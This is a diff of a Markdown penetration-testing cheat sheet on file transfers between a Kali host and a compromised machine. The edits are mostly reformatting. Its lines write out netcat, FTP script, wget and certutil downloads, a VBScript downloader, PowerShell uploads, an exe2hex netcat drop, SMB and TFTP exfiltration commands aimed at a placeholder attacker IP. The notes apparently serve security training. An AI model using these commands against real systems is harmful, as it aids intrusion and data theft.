@@ -8,8 +8,6 @@ output: html_document
 # File transfers
 {:.no_toc}
 
-Here's the content so far:
-
 1. TOC
 {:toc}
 {:style="color:black; font-size: 150%;"}
@@ -22,6 +20,8 @@ Netcat can transfer files in both text and binary. It is simple to use but not a
 nc -nlvp 4444 > incoming.txt                  // Receiving end
 nc -nv <target IP> 4444 < <path to file>      // Sending end
 ````
+
+
 
 ## FTP
 As netcat, FTP can transfer files in both text and binary. Depending on the transfer direction, it may be necessary to install Pure-FTPd on Kali (sudo apt update && sudo apt install pure-ftpd, then create a new user).
@@ -36,19 +36,24 @@ We can also use FTP's *-s* flag, which allows us to specify a text file containi
 - Set up an FTP server on Kali 
 - Place the file to transfer (in this example _nc.exe_) in /ftphome directory.
 - On Windows, create a _ftp.txt_ file containing the commands to execute (transfer the file in binary mode):
-  ````
-  echo open <Kali IP> 21> ftp.txt
-  echo USER <FTP username>>> ftp.txt
-  echo <FTP password>>> ftp.txt
-  echo bin >> ftp.txt
-  echo GET nc.exe >> ftp.txt
-  echo bye >> ftp.txt
-  `````
+
+````
+echo open <Kali IP> 21> ftp.txt
+echo USER <FTP username>>> ftp.txt
+echo <FTP password>>> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+`````
+
 - Download the file from Windows: 
-  ```
-  ftp -v -n -s:ftp.txt
-  ````
-  *-v* to suppress any returned output, *-n* to suppress automatic login, *-s* to specify the file.
+
+```
+ftp -v -n -s:ftp.txt
+````
+
+In the previous command, *-v* is used to suppress any returned output, *-n* to suppress automatic login, *-s* to specify the file.
+
 
 
 ## HTTP
@@ -56,12 +61,14 @@ Often used to serve a file from Kali and download it to the target machine.\\
 Start a web server on Kali (Python or Apache) and download the file from the compromised machine:
 
 ````
-sudo python -m SimpleHTTPServer         // Starts a web server on port 8000 by default
-sudo service Apache2 restart            // Starts an Apache web server
-wget http://<kali_IP>:<port>/<file>     // Downloads the file from a Linux machine
-certutil.exe -urlcache -split -f http://<kali_IP>:<port>/<file>     // Downloads the file from a Windows machine
+sudo python -m SimpleHTTPServer                                      // Starts a web server on port 8000 by default
+sudo service Apache2 restart                                         // Starts an Apache web server
+wget http://<kali_IP>:<port>/<file>                                  // Downloads the file from a Linux machine
+certutil.exe -urlcache -split -f http://<kali_IP>:<port>/<file>      // Downloads the file from a Windows machine
 `````
 Python web root directory is the directory in which the command was issued, whereas Apache's web root directory is always */var/www/*.
+
+
 
 ## VBScript
 We can issue the following commands into a remote shell to write out a _wget.vbs_ script that acts as a HTTP downloader:
@@ -98,6 +105,8 @@ We can then run this script from Windows to download a file on Kali:
 ````
 cscript wget.vbs http://<Kali IP>/<File to download> <Name of the downloaded file>
 `````
+
+
 
 ## Powershell
 PowerShell can be used to transfer files between Kali and Windows in both directions.\\
@@ -156,6 +165,7 @@ powershell (New-Object System.Net.WebClient).UploadFile('http://<Kali IP>/upload
 `````
 
 
+
 ## Exe2hex
 Compress and transfer files. Example to transfer nc.exe from Kali to Windows:
 
@@ -164,6 +174,7 @@ upx -9 nc.exe                   // Compress the file with upx
 exe2hex -x nc.exe -p nc.cmd     // Convert the file to a Windows script (.cmd) with exe2hex
 ````
 Copy the script (we can copy it to the clipboard with _cat nc.cmd | xclip -selection clipboard_) and paste it in the remote shell. This will automatically transfer the hex file on Windows and convert it back to binary (at the end of the script, there are commands which rebuild the _nc.exe_ executable on the target).
+
 
 
 ## Certutil
@@ -175,13 +186,15 @@ certutil.exe -verifyctl -f -split http://<Kali IP>/<File to download> <Name of t
 `````
 
 
+
 ## SMB
 Start a server on Kali/Linux host, and copy the file to the created share (use backslashes and double backslashes in front of Kali's IP in the command below):
 
 ````
-sudo impacket-smbserver <sharename> .
-copy <path to file> \\<kali IP>\<sharename>\<filename>
+sudo impacket-smbserver <sharename> .                           // Receiving end
+copy <path to file> \\<kali IP>\<sharename>\<filename>          // Sending end
 `````
+
 
 
 ## Powercat
@@ -194,22 +207,24 @@ powercat -c <Kali IP> -p 443 -i C:\<path of the object to transfer>   // Sending
 In this command, _-c_ specifies the client mode and sets the listening address, _-i_ indicates the local file to transfer.
 
 
+
 ## TFTP 
 TFTP is a UDP-based file transfer protocol.
 Rarely works (often restricted by egress firewall rules), but can come handy in certain situations. 
 For example, it can be used on older systems if PowerShell isn't installed.
 
 - Install and configure a TFTP server on Kali/Linux (receiving end):
-  ````
-  sudo apt update && sudo apt install atftp
-  sudo mkdir /tftp
-  sudo chown nobody: /tftp
-  sudo atftpd --daemon --port 69 /tftp
-  ````
+````
+sudo apt update && sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
+sudo atftpd --daemon --port 69 /tftp
+````
+
 - On the sending end, run the TFTP client with _-i_ to specify a binary image transfer:
-  ````
-  tftp -i <Kali IP> put <Doc to exfil>
-  ````
+````
+tftp -i <Kali IP> put <Doc to exfil>
+````
 
 ## Socat
 ...
